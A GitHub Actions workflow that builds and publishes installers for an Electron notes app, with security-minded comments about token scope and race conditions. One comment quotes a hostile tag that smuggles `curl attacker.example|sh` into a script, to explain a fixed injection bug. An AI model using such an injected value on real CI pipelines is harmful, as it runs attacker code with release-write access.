name: Release

# Push a version tag to build installers on both OSes and attach them to a
# GitHub Release. macOS is required to produce the .dmg — it can't be built on
# Windows, which is why the build runs on a matrix of runners.
#
#   v1.0.1         -> a normal release. Becomes `releases/latest`, publishes
#                     `latest.yml`, and every installed app updates to it.
#   v1.0.1-rc.1    -> a PRERELEASE. GitHub keeps it out of `releases/latest` and
#                     stable installs ignore it. There is no beta CHANNEL any
#                     more (removed 2026-08-29 — see docs/release-checklist.md);
#                     the `-` handling below stays only so a stray dash-tag can
#                     never reach users, not as a supported "ship to testers"
#                     route.
on:
  push:
    tags:
      - 'v*'

# Read-only by default; the two jobs that actually create or upload a Release
# ask for `contents: write` themselves.
#
# Declared at workflow level, this applied to `verify` too — a job whose only
# work is `npm ci` plus the checks. `actions/checkout` persists the job's token
# into .git/config by default, and `npm ci` runs install scripts from every one
# of the ~500 packages in the lockfile: one compromised build dependency could
# read that token and create or modify a Release. Since a Release is what every
# installed copy of the app auto-updates from, and the build is unsigned, that
# turns a dependency compromise straight into code execution on users' machines.
permissions:
  contents: read

jobs:
  # Nothing gets packaged until this passes. A tag that fails typecheck, lint or
  # tests must never turn into an installer that updates itself onto real
  # machines — this job is the whole point of the gate.
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # This job never pushes, so it has no use for a credential in
          # .git/config — and leaving one there is what a hostile install script
          # would go looking for.
          persist-credentials: false
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run typecheck
      - run: npm run lint
      - run: npm test

  # Both matrix jobs below call `electron-builder --publish always` against
  # the same tag. If the release doesn't exist yet, EACH of them tries to
  # create it -- and since the matrix runs them in parallel, that's a race.
  # Found 2026-08-27: on a brand-new tag, Windows and macOS both hit "create
  # the release" within the same second, and only one of the four expected
  # assets survived the scramble. Creating the release once, here, before
  # either build job starts, means both of them only ever UPLOAD to a release
  # that already exists -- nothing left to race over.
  create-release:
    needs: verify
    permissions:
      contents: write # creates the Release object this tag publishes into
    runs-on: ubuntu-latest
    steps:
      - name: Create the GitHub Release for this tag if it doesn't exist yet
        shell: bash
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          tag="${GITHUB_REF_NAME}"
          version="${tag#v}"
          prerelease=false
          if [[ "$version" == *-* ]]; then
            prerelease=true
          fi

          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "User-Agent: notes-app-release-create" \
            "https://api.github.com/repos/${{ github.repository }}/releases/tags/${tag}")

          if [ "$code" = "200" ]; then
            echo "Release ${tag} already exists, nothing to do."
            exit 0
          fi

          curl -sf -X POST -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "User-Agent: notes-app-release-create" \
            "https://api.github.com/repos/${{ github.repository }}/releases" \
            -d "{\"tag_name\":\"${tag}\",\"name\":\"${tag}\",\"prerelease\":${prerelease}}"

  build:
    needs: create-release
    permissions:
      contents: write # electron-builder uploads the installers onto the Release
    strategy:
      fail-fast: false
      matrix:
        os: [windows-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm

      - run: npm ci

      - name: Build renderer/main/preload
        run: npm run build

      # A tag containing "-" is a prerelease (v0.2.0-beta.1) and needs TWO things
      # set, both of which electron-builder gets wrong by default here:
      #
      # 1. releaseType=prerelease. Otherwise electron-builder.yml's
      #    `releaseType: release` makes the beta `releases/latest` and pushes a
      #    test build to every user and to the download page.
      #
      # 2. channel=beta. electron-builder deliberately does NOT infer the channel
      #    from the version for the GitHub provider (app-builder-lib
      #    updateInfoBuilder.js: "for GitHub should be pre-release way be used"),
      #    so without this it writes `latest.yml` even for 0.2.0-beta.1.
      #    electron-updater asks for `beta.yml` first and only falls back to
      #    `latest.yml` (GitHubProvider.js:133,139) — a channel shouldn't depend
      #    on an undocumented fallback, so name it explicitly.
      - name: Decide release type and channel
        id: kind
        shell: bash
        run: |
          tag="${GITHUB_REF_NAME#v}"                 # 0.2.0-beta.1
          if [[ "$tag" == *-* ]]; then
            pre="${tag#*-}"                          # beta.1
            channel="${pre%%.*}"                     # beta
            # A channel name is a word, and a tag is attacker-shaped input the
            # moment anyone but Reuben can push one. Anything outside this set
            # is not a channel that could work anyway.
            if [[ ! "$channel" =~ ^[A-Za-z0-9.-]+$ ]]; then
              echo "::error::Refusing to publish: '${channel}' is not a usable channel name."
              exit 1
            fi
            echo "args=--config.publish.releaseType=prerelease --config.publish.channel=${channel}" >> "$GITHUB_OUTPUT"
            echo "what=prerelease -> ${channel}.yml" >> "$GITHUB_OUTPUT"
          else
            echo "args=--config.publish.releaseType=release" >> "$GITHUB_OUTPUT"
            echo "what=release -> latest.yml" >> "$GITHUB_OUTPUT"
          fi

      - name: Package installer & publish to the Release
        shell: bash
        env:
          # Passed as environment VALUES rather than pasted into the script by
          # `${{ }}`. That substitution happens before bash ever sees the script,
          # so a tag named `v1.0.0-a;curl attacker.example|sh;x` used to become
          # part of the command text itself — arbitrary execution in the one job
          # holding the Release-write token. Read from the environment, the same
          # string is only ever an argument.
          KIND_ARGS: ${{ steps.kind.outputs.args }}
          KIND_WHAT: ${{ steps.kind.outputs.what }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Unsigned MVP: don't let electron-builder try to find a signing identity.
          CSC_IDENTITY_AUTO_DISCOVERY: 'false'
        run: |
          echo "Publishing as: $KIND_WHAT"
          # Unquoted on purpose — this is two separate flags and has to word-split.
          # shellcheck disable=SC2086
          npx --no-install electron-builder --publish always $KIND_ARGS

  # electron-builder's GitHub publisher silently SKIPS uploading (exit 0, no
  # error) if the release it's publishing to was created more than 2 hours
  # ago — a guard against a stale/delayed CI run clobbering a release that's
  # moved on. That guard has no way to know "clobbering" isn't the risk here;
  # it just as happily protects a release that's incomplete because the OTHER
  # matrix job failed and got re-run hours later (found 2026-08-27: a Windows
  # re-run built Setup.exe/.blockmap/latest.yml perfectly and then logged
  # "skipped publishing ... reason=existing release published more than 2
  # hours ago" for all three — job green, nothing shipped). So "the build
  # jobs are green" is not evidence the release is complete; this job checks
  # the actual GitHub Release object instead.
  verify-release:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Confirm every expected asset actually uploaded
        shell: bash
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          tag="${GITHUB_REF_NAME}"
          version="${tag#v}"
          if [[ "$version" == *-* ]]; then
            pre="${version#*-}"
            yml="${pre%%.*}.yml"
          else
            yml="latest.yml"
          fi
          expected=("Notealise-Setup.exe" "Notealise-Setup.exe.blockmap" "Notealise.dmg" "$yml")

          release_json=$(curl -sf -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "User-Agent: notes-app-release-verify" \
            "https://api.github.com/repos/${{ github.repository }}/releases/tags/${tag}")

          missing=0
          for name in "${expected[@]}"; do
            state=$(echo "$release_json" | python3 -c "import json,sys; d=json.load(sys.stdin); m=[a['state'] for a in d.get('assets',[]) if a['name']=='$name']; print(m[0] if m else 'MISSING')")
            echo "  $name -> $state"
            [ "$state" = "uploaded" ] || missing=1
          done

          if [ "$missing" = "1" ]; then
            echo "::error::Release ${tag} is missing one or more expected assets even though the build jobs above are green. Two known causes, both in docs/release-checklist.md: electron-builder's >2h-old-release publish guard (only relevant on a re-run long after the tag was first pushed), or the two build jobs racing to create the release (should no longer happen now that create-release runs first — if it does, something upstream of that job changed). Either way: don't re-run this workflow, bump to a new patch version and tag that instead."
            exit 1
          fi
          echo "All expected assets are uploaded for ${tag}."
